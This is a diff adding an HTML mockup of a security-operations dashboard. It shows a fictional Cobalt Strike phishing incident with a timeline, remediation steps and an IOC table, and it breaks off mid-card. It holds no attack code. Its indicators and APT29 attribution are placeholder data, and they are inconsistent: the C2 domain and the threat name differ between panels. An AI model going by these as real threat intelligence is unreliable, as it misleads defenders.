@@ -1,0 +1,1076 @@
+<!-- SOC Workbench - Merged Single-Page Dashboard (Basic + Advanced Views) -->
+<!DOCTYPE html>
+
+<html class="dark" lang="en"><head><meta charset="utf-8"/><meta content="width=device-width, initial-scale=1.0" name="viewport"/><link href="https://fonts.googleapis.com" rel="preconnect"/><link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/><link href="https://fonts.googleapis.com/css2?family=Geist:wght@400;500;600;700&amp;family=JetBrains+Mono:wght@400;500;600&amp;display=swap" rel="stylesheet"/><link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&amp;display=swap" rel="stylesheet"/><style>@layer base{html,body{margin:0;padding:0;}body{overscroll-behavior:none;}main>:first-child{margin-top:0!important;}main>:last-child{margin-bottom:0!important;}}::-webkit-scrollbar{display:none;}</style><script src="https://cdn.tailwindcss.com"></script><script id="tailwind-config">tailwind.config = {
+  darkMode: "class",
+  theme: {
+    extend: {
+      "colors": {
+        "surface-dim": "#051424",
+        "on-surface-variant": "#b9cacb",
+        "secondary-fixed-dim": "#00e55b",
+        "on-primary": "#00363a",
+        "on-primary-container": "#006970",
+        "on-primary-fixed": "#002022",
+        "inverse-on-surface": "#233143",
+        "on-secondary-fixed-variant": "#00531b",
+        "surface-container-high": "#1c2b3c",
+        "inverse-surface": "#d4e4fa",
+        "primary": "#dbfcff",
+        "secondary-fixed": "#6bff83",
+        "primary-fixed": "#7df4ff",
+        "on-tertiary-fixed-variant": "#614000",
+        "surface-container": "#122131",
+        "surface-container-lowest": "#010f1f",
+        "tertiary": "#fff4e9",
+        "tertiary-fixed": "#ffddaf",
+        "on-tertiary-fixed": "#281800",
+        "surface": "#051424",
+        "tertiary-container": "#ffd290",
+        "outline": "#849495",
+        "on-primary-fixed-variant": "#004f54",
+        "surface-tint": "#00dbe9",
+        "on-background": "#d4e4fa",
+        "error": "#ffb4ab",
+        "on-tertiary": "#432c00",
+        "surface-container-highest": "#273647",
+        "secondary-container": "#00fe66",
+        "on-tertiary-container": "#805600",
+        "surface-container-low": "#0d1c2d",
+        "outline-variant": "#3b494b",
+        "surface-variant": "#273647",
+        "on-secondary-container": "#007128",
+        "background": "#051424",
+        "error-container": "#93000a",
+        "on-surface": "#d4e4fa",
+        "on-error": "#690005",
+        "primary-fixed-dim": "#00dbe9",
+        "on-secondary": "#003911",
+        "secondary": "#ebffe6",
+        "inverse-primary": "#006970",
+        "primary-container": "#00f0ff",
+        "tertiary-fixed-dim": "#ffba43",
+        "on-secondary-fixed": "#002107",
+        "surface-bright": "#2c3a4c",
+        "on-error-container": "#ffdad6"
+      },
+      "borderRadius": {
+        "DEFAULT": "0.25rem",
+        "lg": "0.5rem",
+        "xl": "0.75rem",
+        "full": "9999px"
+      },
+      "spacing": {
+        "space-xl": "24px",
+        "space-2xl": "32px",
+        "space-2xs": "2px",
+        "space-lg": "16px",
+        "space-xs": "4px",
+        "telemetry-row-height": "28px",
+        "space-sm": "8px",
+        "pane-splitter-width": "1px",
+        "panel-header-height": "36px",
+        "space-md": "12px"
+      },
+      "fontFamily": {
+        "code-md": ["JetBrains Mono"],
+        "body-md": ["Geist"],
+        "headline-lg": ["Geist"],
+        "title-md": ["Geist"],
+        "code-sm": ["JetBrains Mono"],
+        "body-sm": ["Geist"],
+        "display-lg": ["Geist"],
+        "telemetry-micro": ["JetBrains Mono"],
+        "headline-sm": ["Geist"],
+        "code-lg": ["JetBrains Mono"]
+      },
+      "fontSize": {
+        "code-md": ["12px", { "lineHeight": "16px", "fontWeight": "400" }],
+        "body-md": ["13px", { "lineHeight": "18px", "fontWeight": "400" }],
+        "headline-lg": ["24px", { "lineHeight": "30px", "letterSpacing": "-0.015em", "fontWeight": "600" }],
+        "title-md": ["15px", { "lineHeight": "20px", "fontWeight": "600" }],
+        "code-sm": ["11px", { "lineHeight": "14px", "fontWeight": "400" }],
+        "body-sm": ["12px", { "lineHeight": "16px", "fontWeight": "400" }],
+        "display-lg": ["32px", { "lineHeight": "38px", "letterSpacing": "-0.02em", "fontWeight": "700" }],
+        "telemetry-micro": ["10px", { "lineHeight": "12px", "letterSpacing": "0.05em", "fontWeight": "600" }],
+        "headline-sm": ["18px", { "lineHeight": "24px", "letterSpacing": "-0.01em", "fontWeight": "600" }],
+        "code-lg": ["13px", { "lineHeight": "18px", "letterSpacing": "-0.01em", "fontWeight": "500" }]
+      }
+    }
+  }
+}</script></head><body class="bg-background font-body-md text-body-md text-on-surface">
+
+<!-- ============================== SHARED SIDEBAR ============================== -->
+<aside class="fixed left-0 top-0 h-full w-64 bg-surface-container-low z-50 flex flex-col justify-between py-space-md"><div class="flex flex-col gap-space-md"><div class="px-space-md flex items-center justify-between"><div class="flex items-center gap-space-sm"><div class="w-7 h-7 bg-primary-container flex items-center justify-center rounded"><span class="material-symbols-outlined text-on-primary-container text-[18px]">shield_with_house</span></div><div class="flex flex-col"><span class="font-headline-sm text-headline-sm text-primary tracking-wider">AXON<span class="text-primary-container">.REV</span></span><span class="font-telemetry-micro text-telemetry-micro text-on-surface-variant uppercase">Malware Engine v4.8</span></div></div></div><div class="px-space-md"><div class="bg-surface-container p-space-sm rounded flex flex-col gap-space-xs"><div class="flex items-center justify-between"><span class="font-telemetry-micro text-telemetry-micro text-on-surface-variant uppercase">Case Active</span><span class="inline-flex items-center gap-space-2xs px-space-xs py-space-2xs bg-error-container text-error font-telemetry-micro text-telemetry-micro rounded-none uppercase">CRITICAL</span></div><span class="font-code-lg text-code-lg text-primary">#INC-8492</span><span id="sidebar-threat-label" class="font-body-sm text-body-sm text-on-surface-variant truncate">Trojan.Win64.Stealer.Gen</span></div></div><nav class="flex flex-col px-space-sm gap-space-2xs" data-active-classes="bg-surface-container-high text-primary-container font-semibold" data-inactive-classes="text-on-surface-variant hover:bg-surface-container-high hover:text-on-surface"><div class="px-space-sm pt-space-xs pb-space-2xs font-telemetry-micro text-telemetry-micro text-on-surface-variant uppercase tracking-wider">Workspace View</div><a aria-current="page" class="flex items-center gap-space-sm px-space-sm py-space-xs rounded transition-colors bg-surface-container-high text-primary-container font-semibold" data-path="basic-analysis" href="#"><span class="material-symbols-outlined text-[18px]">dashboard</span><span class="font-body-md text-body-md">Basic Analysis</span></a><a class="flex items-center gap-space-sm px-space-sm py-space-xs text-on-surface-variant hover:bg-surface-container-high hover:text-on-surface rounded transition-colors" data-path="advanced-analyst" href="#"><span class="material-symbols-outlined text-[18px]">terminal</span><span class="font-body-md text-body-md">Advanced Analyst</span></a><div class="px-space-sm pt-space-md pb-space-2xs font-telemetry-micro text-telemetry-micro text-on-surface-variant uppercase tracking-wider">Operational Feeds</div><a class="flex items-center gap-space-sm px-space-sm py-space-xs text-on-surface-variant hover:bg-surface-container-high hover:text-on-surface rounded transition-colors" data-path="incident-queue" href="#"><span class="material-symbols-outlined text-[18px]">list_alt</span><span class="font-body-md text-body-md">Incident Queue</span></a><a class="flex items-center gap-space-sm px-space-sm py-space-xs text-on-surface-variant hover:bg-surface-container-high hover:text-on-surface rounded transition-colors" data-path="ioc-repository" href="#"><span class="material-symbols-outlined text-[18px]">fingerprint</span><span class="font-body-md text-body-md">IOC Vault</span></a><a class="flex items-center gap-space-sm px-space-sm py-space-xs text-on-surface-variant hover:bg-surface-container-high hover:text-on-surface rounded transition-colors" data-path="rule-manager" href="#"><span class="material-symbols-outlined text-[18px]">data_object</span><span class="font-body-md text-body-md">YARA Rules</span></a></nav></div><div class="px-space-md flex flex-col gap-space-sm"><div class="p-space-sm bg-surface-container rounded flex flex-col gap-space-2xs"><div class="flex items-center justify-between text-on-surface-variant font-telemetry-micro text-telemetry-micro uppercase"><span>Deobfuscator Node</span><span class="text-secondary-fixed">LIVE</span></div><div class="w-full bg-surface-container-highest h-1 rounded-full overflow-hidden"><div class="bg-secondary-container h-full w-4/5"></div></div></div><div class="flex items-center justify-between pt-space-xs"><div class="flex items-center gap-space-sm"><div class="w-2 h-2 rounded-full bg-secondary-fixed shadow-[0_0_6px_rgba(0,255,102,0.6)]"></div><span class="font-code-sm text-code-sm text-on-surface-variant">LATENCY 14MS</span></div><span class="font-code-sm text-code-sm text-outline">SOC-US-E2</span></div></div></aside>
+
+<!-- ============================== SHARED HEADER + MAIN ============================== -->
+<div class="pl-64"><header class="fixed top-0 left-64 right-0 z-40 bg-surface/80 backdrop-blur-xl shadow-[0_1px_8px_rgba(0,0,0,0.04)]"><div class="h-14 w-full px-space-lg flex items-center justify-between"><div class="flex items-center gap-space-lg"><nav class="bg-surface-container-low p-space-2xs rounded flex items-center gap-space-2xs" data-active-classes="bg-primary-container text-on-primary-container font-semibold" data-inactive-classes="text-on-surface-variant hover:text-on-surface font-body-sm text-body-sm"><a aria-current="page" class="px-space-md py-space-xs rounded transition-colors bg-primary-container text-on-primary-container font-semibold" data-path="basic-analysis" href="#">Basic View</a><a class="px-space-md py-space-xs rounded text-on-surface-variant hover:text-on-surface font-body-sm text-body-sm transition-colors" data-path="advanced-analyst" href="#">Advanced View</a></nav><div class="hidden xl:flex items-center gap-space-sm"><span class="font-code-sm text-code-sm text-on-surface-variant">TARGET:</span><span class="font-code-sm text-code-sm text-on-surface bg-surface-container px-space-xs py-space-2xs rounded">payload_unpacked.bin</span><span class="font-telemetry-micro text-telemetry-micro text-on-surface-variant font-mono">SHA256: 7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069</span></div></div><div class="flex items-center gap-space-md"><div class="flex items-center gap-space-xs"><span id="header-risk-badge" class="inline-flex items-center px-space-xs py-space-2xs bg-error-container text-error font-telemetry-micro text-telemetry-micro rounded-none">THREAT 9.8</span><span class="inline-flex items-center px-space-xs py-space-2xs bg-surface-container-high text-on-surface-variant font-telemetry-micro text-telemetry-micro rounded-none">MITRE T1059</span></div><div class="w-8 h-8 rounded-full bg-primary flex items-center justify-center"><span class="material-symbols-outlined text-on-primary text-[18px]">person</span></div></div></div></header>
+
+<main class="w-full pt-14 px-space-lg bg-surface">
+
+<!-- ================================================================== -->
+<!--              BASIC ANALYSIS VIEW  (data-view)                      -->
+<!-- ================================================================== -->
+<div data-view="basic-analysis">
+<div class="flex flex-col w-full pb-space-2xl space-y-space-xl">
+<!-- 1. Executive Incident Header Banner -->
+<section class="relative rounded-xl overflow-hidden bg-surface-container-low shadow-xl p-space-xl">
+<div class="absolute -right-20 -top-20 w-80 h-80 bg-error/10 rounded-full blur-3xl pointer-events-none"></div>
+<div class="absolute -left-16 bottom-0 w-64 h-64 bg-primary-container/5 rounded-full blur-2xl pointer-events-none"></div>
+<div class="relative z-10 flex flex-col lg:flex-row lg:items-center justify-between gap-space-lg">
+<div class="flex flex-col gap-space-xs max-w-3xl">
+<div class="flex flex-wrap items-center gap-space-sm">
+<span id="simple-risk-badge" class="inline-flex items-center gap-space-xs px-space-sm py-space-2xs bg-error-container/80 text-error font-telemetry-micro text-telemetry-micro uppercase tracking-wider rounded">
+<span class="w-2 h-2 rounded-full bg-error animate-ping"></span>
+            CRITICAL THREAT
+          </span>
+<span class="font-telemetry-micro text-telemetry-micro text-outline uppercase tracking-wider">Case ID</span>
+<span class="font-code-md text-code-md text-primary bg-surface-container px-space-xs py-space-2xs rounded">#INC-8492</span>
+<span class="font-body-sm text-body-sm text-on-surface-variant flex items-center gap-space-2xs">
+<span class="material-symbols-outlined text-[14px] text-outline">schedule</span>
+            Detected 14 mins ago
+          </span>
+</div>
+<h1 id="simple-threat-name" class="font-display-lg text-display-lg text-primary tracking-tight mt-space-xs">
+          Trojan.Win32.CobaltStrike.Stager
+        </h1>
+<div class="flex flex-wrap items-center gap-space-md text-on-surface-variant font-body-sm text-body-sm pt-space-2xs">
+<span class="flex items-center gap-space-xs">
+<span class="material-symbols-outlined text-[16px] text-secondary-fixed">verified</span>
+            Status: <span class="text-on-surface font-semibold">Triage Confirmed</span>
+</span>
+<span class="text-outline-variant">•</span>
+<span class="flex items-center gap-space-xs">
+<span class="material-symbols-outlined text-[16px] text-tertiary-fixed-dim">mail</span>
+            Vector: <span class="text-on-surface">Phishing Email Attachment</span>
+</span>
+<span class="text-outline-variant">•</span>
+<span class="flex items-center gap-space-xs">
+<span class="material-symbols-outlined text-[16px] text-primary-fixed">dns</span>
+            Scope: <span class="text-on-surface">1 Host Endpoint</span>
+</span>
+</div>
+</div>
+<!-- Header Quick Actions -->
+<div class="flex flex-wrap sm:flex-nowrap items-center gap-space-sm">
+<button class="group relative px-space-lg py-space-sm bg-primary-container text-on-primary-container font-headline-sm text-body-md font-bold tracking-wide uppercase rounded shadow-lg hover:shadow-[0_0_20px_rgba(0,240,255,0.4)] transition-all flex items-center gap-space-xs active:scale-95" id="quarantine-btn">
+<span class="material-symbols-outlined text-[20px] transition-transform group-hover:scale-110">shield</span>
+<span>Approve Containment</span>
+</button>
+<button class="px-space-md py-space-sm bg-surface-container-high hover:bg-surface-bright text-on-surface font-body-md text-body-md font-medium rounded transition-colors flex items-center gap-space-xs shadow-md">
+<span class="material-symbols-outlined text-[18px] text-on-surface-variant">picture_as_pdf</span>
+<span>Export Brief</span>
+</button>
+<button class="px-space-sm py-space-sm bg-surface-container-high hover:bg-surface-bright text-on-surface-variant hover:text-on-surface rounded transition-colors shadow-md" title="Escalate to IR Lead">
+<span class="material-symbols-outlined text-[20px]">person_alert</span>
+</button>
+</div>
+</div>
+</section>
+<!-- 2. Primary Summary Cards (Top Row) -->
+<section class="grid grid-cols-1 lg:grid-cols-3 gap-space-lg">
+<!-- Card 1: What Happened? -->
+<div class="relative bg-surface-container-low rounded-xl p-space-xl flex flex-col justify-between shadow-lg overflow-hidden group">
+<div class="absolute top-0 left-0 w-1.5 h-full bg-primary-container"></div>
+<div>
+<div class="flex items-center justify-between pb-space-md">
+<div class="flex items-center gap-space-sm">
+<div class="w-8 h-8 rounded-lg bg-surface-container-high flex items-center justify-center text-primary-container">
+<span class="material-symbols-outlined text-[20px]">help_center</span>
+</div>
+<h2 class="font-headline-sm text-headline-sm text-primary">What Happened?</h2>
+</div>
+<span class="font-telemetry-micro text-telemetry-micro uppercase px-space-xs py-space-2xs bg-surface-container text-on-surface-variant rounded">Executive Summary</span>
+</div>
+<p id="simple-intent" class="font-body-md text-body-md text-on-surface leading-relaxed mt-space-xs">
+          A malicious PowerShell script attempted to bypass system security, establish a covert connection to an unauthorized external server (<span class="font-code-sm text-code-sm text-primary bg-surface-container px-space-xs py-0.5 rounded">c2-updates-win.org</span>), and inject beacon payloads into legitimate Windows system processes.
+        </p>
+</div>
+<div class="mt-space-lg pt-space-md bg-surface-container/60 rounded-lg p-space-sm flex items-center gap-space-sm">
+<span class="material-symbols-outlined text-[20px] text-secondary-fixed">security</span>
+<span class="font-body-sm text-body-sm text-secondary-fixed font-medium">Automatic memory isolation blocked core payload delivery.</span>
+</div>
+</div>
+<!-- Card 2: Risk & Impact Assessment -->
+<div class="bg-surface-container-low rounded-xl p-space-xl flex flex-col justify-between shadow-lg relative overflow-hidden">
+<div>
+<div class="flex items-center justify-between pb-space-md">
+<div class="flex items-center gap-space-sm">
+<div class="w-8 h-8 rounded-lg bg-error-container/40 flex items-center justify-center text-error">
+<span class="material-symbols-outlined text-[20px]">warning</span>
+</div>
+<h2 class="font-headline-sm text-headline-sm text-primary">Risk &amp; Impact</h2>
+</div>
+<span class="font-telemetry-micro text-telemetry-micro uppercase px-space-xs py-space-2xs bg-error-container/60 text-error rounded">Active Threat</span>
+</div>
+<div class="flex items-center gap-space-lg pt-space-xs">
+<!-- Mini Ring Meter -->
+<div class="relative w-20 h-20 flex-shrink-0 flex items-center justify-center">
+<svg class="w-full h-full transform -rotate-90" viewbox="0 0 36 36">
+<path class="text-surface-container-highest" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" fill="none" stroke="currentColor" stroke-width="3.5"></path>
+<path class="text-error" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" fill="none" stroke="currentColor" stroke-dasharray="94, 100" stroke-linecap="round" stroke-width="3.5"></path>
+</svg>
+<div class="absolute flex flex-col items-center">
+<span class="font-headline-lg text-headline-lg text-error font-bold leading-none">94</span>
+<span class="font-telemetry-micro text-[9px] text-on-surface-variant uppercase">/ 100</span>
+</div>
+</div>
+<div class="flex flex-col gap-space-2xs">
+<span class="font-headline-sm text-title-md text-on-surface">Extreme Breach Severity</span>
+<span class="font-body-sm text-body-sm text-on-surface-variant">Intent: Data exfiltration and credential dumping via memory beaconing.</span>
+</div>
+</div>
+</div>
+<div class="grid grid-cols-2 gap-space-sm pt-space-md mt-space-sm">
+<div class="bg-surface-container p-space-sm rounded">
+<span class="font-telemetry-micro text-telemetry-micro text-on-surface-variant uppercase block">Target Workstation</span>
+<span class="font-code-md text-code-md text-primary font-semibold truncate block mt-0.5">FIN-WS-092</span>
+</div>
+<div class="bg-surface-container p-space-sm rounded">
+<span class="font-telemetry-micro text-telemetry-micro text-on-surface-variant uppercase block">Host State</span>
+<span class="font-body-sm text-body-sm text-secondary-fixed font-semibold truncate flex items-center gap-1 mt-0.5">
+<span class="w-1.5 h-1.5 rounded-full bg-secondary-fixed"></span>
+            Isolated by EDR
+          </span>
+</div>
+</div>
+</div>
+<!-- Card 3: Recommended Next Steps -->
+<div class="bg-surface-container-low rounded-xl p-space-xl flex flex-col justify-between shadow-lg relative">
+<div>
+<div class="flex items-center justify-between pb-space-md">
+<div class="flex items-center gap-space-sm">
+<div class="w-8 h-8 rounded-lg bg-surface-container-high flex items-center justify-center text-primary-fixed">
+<span class="material-symbols-outlined text-[20px]">checklist</span>
+</div>
+<h2 class="font-headline-sm text-headline-sm text-primary">Remediation Steps</h2>
+</div>
+<span class="font-telemetry-micro text-telemetry-micro uppercase px-space-xs py-space-2xs bg-secondary-container/20 text-secondary-fixed rounded">3 Pending</span>
+</div>
+<ul class="space-y-space-sm mt-space-xs">
+<li class="flex items-start gap-space-sm text-body-sm">
+<span class="w-5 h-5 rounded-full bg-surface-container-high text-primary flex items-center justify-center font-code-sm text-code-sm font-semibold mt-0.5">1</span>
+<div class="flex flex-col">
+<span class="text-on-surface font-medium">Revoke compromised user session</span>
+<span class="font-code-sm text-code-sm text-on-surface-variant">User: FIN\jsmith</span>
+</div>
+</li>
+<li class="flex items-start gap-space-sm text-body-sm">
+<span class="w-5 h-5 rounded-full bg-surface-container-high text-primary flex items-center justify-center font-code-sm text-code-sm font-semibold mt-0.5">2</span>
+<div class="flex flex-col">
+<span class="text-on-surface font-medium">Block C2 domain at Edge Gateway</span>
+<span class="font-code-sm text-code-sm text-outline">cdn-updates-win.org</span>
+</div>
+</li>
+<li class="flex items-start gap-space-sm text-body-sm">
+<span class="w-5 h-5 rounded-full bg-surface-container-high text-primary flex items-center justify-center font-code-sm text-code-sm font-semibold mt-0.5">3</span>
+<div class="flex flex-col">
+<span class="text-on-surface font-medium">Run full telemetry scan</span>
+<span class="text-on-surface-variant font-body-sm text-body-sm">46 fleet agent sensors</span>
+</div>
+</li>
+</ul>
+</div>
+<button class="mt-space-md w-full py-space-sm bg-surface-container-high hover:bg-surface-bright text-primary font-body-md text-body-md font-semibold rounded flex items-center justify-center gap-space-xs transition-all shadow" id="remediate-all-btn">
+<span class="material-symbols-outlined text-[18px]">play_circle</span>
+<span>Execute Full Remediation Plan</span>
+</button>
+</div>
+</section>
+<!-- 3. Attack Flow & Plain-English Timeline -->
+<section class="bg-surface-container-low rounded-xl p-space-xl shadow-lg">
+<div class="flex flex-col sm:flex-row sm:items-center justify-between pb-space-lg gap-space-sm">
+<div class="flex items-center gap-space-sm">
+<div class="w-8 h-8 rounded-lg bg-surface-container flex items-center justify-center text-primary-container">
+<span class="material-symbols-outlined text-[20px]">account_tree</span>
+</div>
+<div>
+<h2 class="font-headline-sm text-headline-sm text-primary">Attack Progression Timeline</h2>
+<p class="font-body-sm text-body-sm text-on-surface-variant">Step-by-step chronology translated from machine telemetry into human events</p>
+</div>
+</div>
+<span class="font-telemetry-micro text-telemetry-micro text-secondary-fixed bg-secondary-container/10 px-space-sm py-space-xs rounded flex items-center gap-1 self-start sm:self-auto">
+<span class="w-1.5 h-1.5 rounded-full bg-secondary-fixed"></span>
+        CONTAINMENT VERIFIED AT STEP 4
+      </span>
+</div>
+<!-- 4-Step Visual Sequence -->
+<div class="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-4 gap-space-md relative mt-space-sm">
+<!-- Step 1 -->
+<div class="bg-surface-container rounded-lg p-space-md flex flex-col justify-between relative shadow transition-all hover:bg-surface-container-high">
+<div class="flex items-center justify-between mb-space-sm">
+<span class="font-telemetry-micro text-telemetry-micro text-primary-container font-semibold uppercase tracking-wider">Phase 01 · 09:14:02 AM</span>
+<span class="w-6 h-6 rounded-full bg-surface-container-highest text-on-surface flex items-center justify-center text-code-sm font-code-sm">1</span>
+</div>
+<div class="flex items-start gap-space-sm mb-space-md">
+<div class="p-2 rounded bg-surface-container-low text-tertiary-fixed-dim">
+<span class="material-symbols-outlined text-[22px]">mark_email_read</span>
+</div>
+<div>
+<h3 class="font-title-md text-title-md text-on-surface font-semibold">Script Execution</h3>
+<p class="font-body-sm text-body-sm text-on-surface-variant mt-1">
+              User opened email invoice attachment <span class="font-code-sm text-code-sm text-primary bg-surface-container-low px-1 py-0.5 rounded">invoice_984.vbs</span>, automatically invoking Windows PowerShell.
+            </p>
+</div>
+</div>
+<div class="pt-space-xs text-on-surface-variant font-code-sm text-code-sm flex items-center justify-between bg-surface-container-low px-space-sm py-1 rounded">
+<span>Parent: Outlook</span>
+<span class="text-outline">PID 4192</span>
+</div>
+</div>
+<!-- Step 2 -->
+<div class="bg-surface-container rounded-lg p-space-md flex flex-col justify-between relative shadow transition-all hover:bg-surface-container-high">
+<div class="flex items-center justify-between mb-space-sm">
+<span class="font-telemetry-micro text-telemetry-micro text-primary-container font-semibold uppercase tracking-wider">Phase 02 · 09:14:18 AM</span>
+<span class="w-6 h-6 rounded-full bg-surface-container-highest text-on-surface flex items-center justify-center text-code-sm font-code-sm">2</span>
+</div>
+<div class="flex items-start gap-space-sm mb-space-md">
+<div class="p-2 rounded bg-surface-container-low text-tertiary-fixed-dim">
+<span class="material-symbols-outlined text-[22px]">lock_reset</span>
+</div>
+<div>
+<h3 class="font-title-md text-title-md text-on-surface font-semibold">Defense Evasion</h3>
+<p class="font-body-sm text-body-sm text-on-surface-variant mt-1">
+              Script used nested Base64 and memory XOR masking to prevent file-system antivirus inspection on the local hard drive.
+            </p>
+</div>
+</div>
+<div class="pt-space-xs text-on-surface-variant font-code-sm text-code-sm flex items-center justify-between bg-surface-container-low px-space-sm py-1 rounded">
+<span>Method: Fileless Memory</span>
+<span class="text-tertiary-fixed-dim">Stealth</span>
+</div>
+</div>
+<!-- Step 3 -->
+<div class="bg-surface-container rounded-lg p-space-md flex flex-col justify-between relative shadow transition-all hover:bg-surface-container-high">
+<div class="flex items-center justify-between mb-space-sm">
+<span class="font-telemetry-micro text-telemetry-micro text-primary-container font-semibold uppercase tracking-wider">Phase 03 · 09:14:32 AM</span>
+<span class="w-6 h-6 rounded-full bg-surface-container-highest text-on-surface flex items-center justify-center text-code-sm font-code-sm">3</span>
+</div>
+<div class="flex items-start gap-space-sm mb-space-md">
+<div class="p-2 rounded bg-surface-container-low text-error">
+<span class="material-symbols-outlined text-[22px]">cell_tower</span>
+</div>
+<div>
+<h3 class="font-title-md text-title-md text-on-surface font-semibold">C2 Callout</h3>
+<p class="font-body-sm text-body-sm text-on-surface-variant mt-1">
+              Contacted external server via TLS port 443 to retrieve secondary Cobalt Strike reflective staging instructions.
+            </p>
+</div>
+</div>
+<div class="pt-space-xs text-on-surface-variant font-code-sm text-code-sm flex items-center justify-between bg-surface-container-low px-space-sm py-1 rounded">
+<span>Dest: 185.220.101.5</span>
+<span class="text-error">Flagged Host</span>
+</div>
+</div>
+<!-- Step 4 -->
+<div class="bg-surface-container rounded-lg p-space-md flex flex-col justify-between relative shadow transition-all hover:bg-surface-container-high ring-1 ring-secondary-container/40">
+<div class="flex items-center justify-between mb-space-sm">
+<span class="font-telemetry-micro text-telemetry-micro text-secondary-fixed font-semibold uppercase tracking-wider">Phase 04 · 09:14:41 AM</span>
+<span class="w-6 h-6 rounded-full bg-secondary-container text-on-secondary-container flex items-center justify-center text-code-sm font-code-sm font-bold">✓</span>
+</div>
+<div class="flex items-start gap-space-sm mb-space-md">
+<div class="p-2 rounded bg-secondary-container/20 text-secondary-fixed">
+<span class="material-symbols-outlined text-[22px]">shield_lock</span>
+</div>
+<div>
+<h3 class="font-title-md text-title-md text-secondary-fixed font-semibold">Injection Neutralized</h3>
+<p class="font-body-sm text-body-sm text-on-surface-variant mt-1">
+              Attempted thread hijack of <span class="font-code-sm text-code-sm text-primary bg-surface-container-low px-1 py-0.5 rounded">explorer.exe</span>. Sensor intercepted memory allocation and terminated process.
+            </p>
+</div>
+</div>
+<div class="pt-space-xs text-secondary-fixed font-code-sm text-code-sm flex items-center justify-between bg-surface-container-low px-space-sm py-1 rounded">
+<span>Action: EDR Kernel Kill</span>
+<span class="font-semibold">Prevented</span>
+</div>
+</div>
+</div>
+</section>
+<!-- 4. Key Indicators & Highlights (Non-Coder Format) -->
+<section class="grid grid-cols-1 lg:grid-cols-4 gap-space-lg">
+<div class="lg:col-span-3 bg-surface-container-low rounded-xl p-space-xl shadow-lg">
+<div class="flex items-center justify-between pb-space-md">
+<div class="flex items-center gap-space-sm">
+<div class="w-8 h-8 rounded-lg bg-surface-container flex items-center justify-center text-primary-container">
+<span class="material-symbols-outlined text-[20px]">fingerprint</span>
+</div>
+<div>
+<h2 class="font-headline-sm text-headline-sm text-primary">Identified Threat Evidence (IOCs)</h2>
+<p class="font-body-sm text-body-sm text-on-surface-variant">Validated indicators for security controls &amp; network filters</p>
+</div>
+</div>
+<span class="font-telemetry-micro text-telemetry-micro text-on-surface-variant uppercase">3 Primary Artifacts</span>
+</div>
+<div class="overflow-x-auto">
+<table class="w-full text-left font-body-sm text-body-sm">
+<thead>
+<tr class="bg-surface-container text-on-surface-variant font-telemetry-micro text-telemetry-micro uppercase tracking-wider">
+<th class="py-space-sm px-space-md rounded-l">Indicator / Value</th>
+<th class="py-space-sm px-space-md">Type</th>
+<th class="py-space-sm px-space-md">Detection Confidence</th>
+<th class="py-space-sm px-space-md">Classification</th>
+<th class="py-space-sm px-space-md text-right rounded-r">Action</th>
+</tr>
+</thead>
+<tbody class="divide-y divide-surface-container">
+<tr class="hover:bg-surface-container/40 transition-colors">
+<td class="py-space-sm px-space-md font-code-md text-code-md text-primary flex items-center gap-space-xs">
+<span class="material-symbols-outlined text-[16px] text-error">public</span>
+                c2-updates-win.org
+              </td>
+<td class="py-space-sm px-space-md text-on-surface">External C2 Domain</td>
+<td class="py-space-sm px-space-md">
+<span class="inline-flex items-center gap-1 text-secondary-fixed font-code-sm text-code-sm">
+<span class="w-1.5 h-1.5 rounded-full bg-secondary-fixed"></span> 100% Confirmed
+                </span>
+</td>
+<td class="py-space-sm px-space-md">
+<span class="font-telemetry-micro text-telemetry-micro px-space-xs py-space-2xs bg-error-container/60 text-error rounded">APT29 Infrastructure</span>
+</td>
+<td class="py-space-sm px-space-md text-right">
+<button class="px-space-xs py-1 text-code-sm text-primary hover:bg-surface-container rounded transition-colors">Add to Blocklist</button>
+</td>
+</tr>
+<tr class="hover:bg-surface-container/40 transition-colors">
+<td class="py-space-sm px-space-md font-code-md text-code-md text-primary flex items-center gap-space-xs">
+<span class="material-symbols-outlined text-[16px] text-tertiary-fixed-dim">lan</span>
+                185.220.101.5:443
+              </td>
+<td class="py-space-sm px-space-md text-on-surface">IPv4 Endpoint</td>
+<td class="py-space-sm px-space-md">
+<span class="inline-flex items-center gap-1 text-secondary-fixed font-code-sm text-code-sm">
+<span class="w-1.5 h-1.5 rounded-full bg-secondary-fixed"></span> 99.4% Verified
+                </span>
+</td>
+<td class="py-space-sm px-space-md">
+<span class="font-telemetry-micro text-telemetry-micro px-space-xs py-space-2xs bg-surface-container text-tertiary-fixed-dim rounded">TOR Exit Relay</span>
+</td>
+<td class="py-space-sm px-space-md text-right">
+<button class="px-space-xs py-1 text-code-sm text-primary hover:bg-surface-container rounded transition-colors">Add to Blocklist</button>
+</td>
+</tr>
+<tr class="hover:bg-surface-container/40 transition-colors">
+<td class="py-space-sm px-space-md font-code-md text-code-md text-primary flex items-center gap-space-xs">
+<span class="material-symbols-outlined text-[16px] text-on-surface-variant">description</span>
+                invoice_984.vbs
+              </td>
+<td class="py-space-sm px-space-md text-on-surface">Malicious Attachment</td>
+<td class="py-space-sm px-space-md">
+<span class="inline-flex items-center gap-1 text-secondary-fixed font-code-sm text-code-sm">
+<span class="w-1.5 h-1.5 rounded-full bg-secondary-fixed"></span> 100% Confirmed
+                </span>
+</td>
+<td class="py-space-sm px-space-md">
+<span class="font-telemetry-micro text-telemetry-micro px-space-xs py-space-2xs bg-surface-container text-on-surface rounded">Trojan Dropper</span>
+</td>
+<td class="py-space-sm px-space-md text-right">
+<button class="px-space-xs py-1 text-code-sm text-primary hover:bg-surface-container rounded transition-colors">Purge Inboxes</button>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+<!-- Threat Profile & Attribution Card -->
+<div class="bg-surface-container-low rounded-xl p-space-xl shadow-lg flex flex-col justify-between">
+<div>
+<div class="flex items-center gap-space-sm pb-space-md">
+<div class="w-8 h-8 rounded-lg bg-surface-container flex items-center justify-center text-primary-container">
+<span class="material-symbols-outlined text-[20px]">psychology</span>
